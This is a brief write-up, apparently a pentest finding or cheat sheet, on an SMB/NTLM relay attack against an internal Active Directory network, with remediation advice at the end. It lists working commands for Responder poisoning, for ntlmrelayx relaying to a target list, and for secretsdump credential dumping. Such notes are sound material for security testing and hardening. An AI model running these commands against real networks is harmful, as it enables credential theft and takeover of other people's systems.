# SMB Relay Attack - Internal Network Takeover

**Type:** NTLM Relay / SMB Relay  
**Severity:** Critical  
**Environment:** Internal AD network  

## Attack Flow

```
1. Attacker starts Responder (LLMNR/NBT-NS poisoning)
2. Victim authenticates to attacker (thinking it's a share)
3. Attacker relays NTLM auth to target server
4. Attacker gets authenticated session on target
```

## Tools Used

```bash
# Terminal 1: Disable SMB/HTTP in Responder.conf, then:
sudo responder -I eth0 -rdw

# Terminal 2: ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -i

# Once shell obtained:
secretsdump.py -no-pass 127.0.0.1
```

## Remediation

- Enable SMB signing on all systems
- Disable LLMNR and NBT-NS
- Enable EPA (Extended Protection for Authentication)
- Segment network to prevent lateral spread
